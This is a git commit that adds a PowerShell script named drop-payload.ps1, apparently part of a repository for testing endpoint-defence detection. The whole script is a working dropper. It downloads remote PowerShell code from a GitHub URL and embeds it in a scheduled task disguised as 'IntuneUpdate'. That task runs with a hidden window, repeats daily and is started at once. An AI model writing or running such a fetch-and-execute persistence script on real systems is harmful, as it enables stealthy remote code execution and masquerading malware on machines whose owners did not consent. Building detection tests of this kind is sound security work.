c27672f8bee92deebdec8cb4f4af3c9e5dd4e7c7
FuzzyKittens <kory.kliner@outlook.com>
2023-06-06 21:22:16 -0400

    Create drop-payload.ps1

---
+++ drop-payload.ps1
@@ -0,0 +1,19 @@
+$payloadText = 'https://raw.githubusercontent.com/FuzzyKittens/MDETest/main/notepad.ps1'
+$payload = ((New-Object System.Net.WebClient).DownloadString($payloadText))
+
+$taskName = 'IntuneUpdate'
+$taskArgument = '-NoProfile -WindowStyle Hidden -Command "& { PAYLOAD }"'.Replace('PAYLOAD',$payload)
+
+$taskExists = Get-ScheduledTask | Where-Object {$_.TaskName -like $taskName }
+if ($taskExists) {
+    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
+    }
+
+$action = New-ScheduledTaskAction -Execute 'PowerShell.exe' -Argument $taskArgument
+$trigger = New-ScheduledTaskTrigger -Daily -At "9:00 AM"
+
+$taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -DontStopOnIdleEnd -StartWhenAvailable
+
+$null = Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $taskSettings
+
+Start-ScheduledTask -TaskName $taskName
